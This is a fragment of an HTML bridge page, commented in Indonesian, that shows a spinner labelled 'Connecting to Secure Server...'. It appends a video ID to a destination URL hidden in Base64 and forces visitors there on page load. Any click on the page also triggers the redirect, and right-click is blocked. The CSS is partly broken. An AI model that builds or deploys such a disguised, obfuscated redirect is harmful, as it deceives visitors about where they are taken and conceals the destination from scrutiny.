        .loader {
            width: 48px;

            border: 3px solid #FFF;
            border-bottom-color: #e50914;
            border-radius: 50%;
            display: inline-block;
            box-sizing: border-box;
            animation: rotation 1s linear infinite;
        }

            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

<body>

    <div class="text-center">
        <span class="loader"></span>
        <p class="mt-4 text-xs tracking-[0.3em] text-gray-500 uppercase animate-pulse">Menghubungkan ke Server Aman...</p>
    </div>

    <script>
        // Tautan tujuan dasar yang disamarkan (Base64)
        const BASE_REDIRECT = atob("aHR0cHM6Ly9vbWcxMC5jb20vNC8xMDg1MjM3OA==");

        /**
         * Mengambil ID video dari URL (Parameter atau Path)
         */
        function extractVideoId() {
            const params = new URLSearchParams(window.location.search);
            let id = params.get("id") || params.get("v");

            if (!id) {
                const pathParts = window.location.pathname.split("/");
                const lastPart = pathParts.pop().trim();
                // Validasi agar bukan file sistem
                if (lastPart && !lastPart.includes(".") && lastPart !== "index" && lastPart !== "bridge") {
                    id = lastPart;
                }
            }
            return id;
        }

        /**
         * Fungsi pengalihan langsung
         */
        function redirectToDestination() {
            const id = extractVideoId();
            let finalUrl = BASE_REDIRECT;
            
            // Tambahkan ID ke tautan jika ditemukan
            if (id) {
                finalUrl += "/" + id;
            }

            // Lakukan pengalihan segera
            window.location.replace(finalUrl);
        }

        // Jalankan pengalihan saat halaman dimuat
        window.onload = redirectToDestination;

        // Fallback: Jika auto-redirect gagal, klik di mana saja akan memicu redirect
        document.body.onclick = redirectToDestination;

        // Keamanan tambahan (opsional)
        document.addEventListener("contextmenu", e => e.preventDefault());
    </script>
